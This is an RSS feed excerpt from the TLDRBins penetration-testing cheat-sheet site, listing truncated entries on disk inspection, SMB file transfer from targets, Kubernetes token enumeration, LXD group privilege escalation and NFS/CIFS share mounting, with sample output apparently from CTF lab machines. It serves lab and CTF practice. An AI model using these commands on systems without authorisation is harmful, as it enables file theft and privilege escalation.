channel.title: File System Mounting on TLDRBins
channel.description: Recent content in File System Mounting on TLDRBins

item.title: Disk Group
item.description: General # Show devices lsblk $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 12G 0 disk ├─sda1 8:1 0 120M 0 part /boot ├─sda2 8:2 0 1K 0 part └─sda5 8:5 0 11.9G 0 part ├─Kotarak--vg-root 252:0 0 7G 0 lvm / └─Kotarak--vg-swap_1 252:1 0 1G 0 lvm [SWAP] sr0 11:0 1 1024M 0 rom # Device attributes blkid $ blkid /dev/sda1: UUID="67e178a9-1b2a-407e-8d3f-7b1772bab2be" TYPE="ext2" PARTUUID="1b9f3540-01" /dev/sda5: UUID="LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD" TYPE="LVM2_member" PARTUUID="1b9f3540-05" /dev/mapper/Kotarak--vg-root: UUID="efb44a28-8edc-4d40-aca3-81e57d58d759" TYPE="ext4" /dev/mapper/Kotarak--vg-swap_1: UUID="162b2913-7dcf-4ba7-bddc-238a22f16e52" TYPE="swap" # Show device mapping ls -l /dev/mapper/ $ ls -l /dev/mapper/ total 0 crw------- 1 root root 10, 236 Sep 22 23:22 control lrwxrwxrwx 1 root root 7 Sep 22 23:22 Kotarak--vg-root -> .

item.title: File Transfer (Windows To Linux)
item.description: SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\<LOCAL_IP>\share # Connect to SMB server with creds net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>' # From target Windows to local Linux copy <FILE> \\<LOCAL_IP>\share # From local Linux to target Windows copy \\<LOCAL_IP>\share\<FILE> <FILE> # Delete file del <FILE> # Remove SMB share net use /d \\<LOCAL_IP>\share # Older Windows (e.

item.title: File Transfer (Windows To Windows)
item.description: SMB # Connect to SMB server without creds net use \\<LOCAL_IP>\share # Connect to SMB server with server name net use \\<SERVER_NAME>\share # Connect to SMB server with creds net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>' # Mount to a drive with creds net use X: \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>' # From local Windows to target Windows copy <FILE> \\<LOCAL_IP>\share # From target Windows to local Windows copy \\<LOCAL_IP>\share\<FILE> <FILE> # Delete file del <FILE> # Remove SMB share net use /d \\<LOCAL_IP>\share # Remove drive net use /d X: # Older Windows (e.

item.title: Kubernetes
item.description: Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt General # List all namespaces kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get namespaces # Get user permissions in current namespace kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list # Get user permissions in specific namespace kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list -n <NAMESPACE> # List all pods kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods --all-namespaces # List pods in specific namespace kubectl --token <TOKEN> --certificate-authority ca.

item.title: Lxd
item.description: General # Check if user in lxd group id orestis@brainfuck:~$ id uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare) # List containers lxc list orestis@brainfuck:~$ lxc list Generating a client certificate. This may take a minute... If this is your first time using LXD, you should also run: sudo lxd init To start your first container, try: lxc launch ubuntu:16.04 +------+-------+------+------+------+-----------+ | NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS | +------+-------+------+------+------+-----------+ # List images lxc image list orestis@brainfuck:~$ lxc image list +-------+-------------+--------+-------------+------+------+-------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +-------+-------------+--------+-------------+------+------+-------------+ Abuse #1: Mount host’s File System # Upload a 656 bytes conatiner image echo  | base64 -d > test.

item.title: Share Mount
item.description: NFS SMB List Shares showmount -e <TARGET> $ showmount -e 10.10.11.191 Export list for 10.10.11.191: /home/ross * /var/www/html * Mount Share sudo mkdir /mnt/share $ sudo mkdir /mnt/share sudo mount -t nfs <TARGET>:<SHARE> /mnt/share/ $ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/share/ $ ls /mnt/share Desktop Documents Downloads Music Pictures Public Templates Videos Unmount Share sudo umount /mnt/share/ $ sudo umount /mnt/share/ Mount Share sudo mount -t cifs //<TARGET>/<SHARE> /mnt # Without creds sudo mount -t cifs -o user=,password= //<TARGET>/<SHARE> /mnt # With creds sudo mount -t cifs -o user='<USER>',pass='<PASSWORD>' //<TARGET>/<SHARE> /mnt $ sudo mount -t cifs -o ro,user='localadmin',password='Secret123' //10.
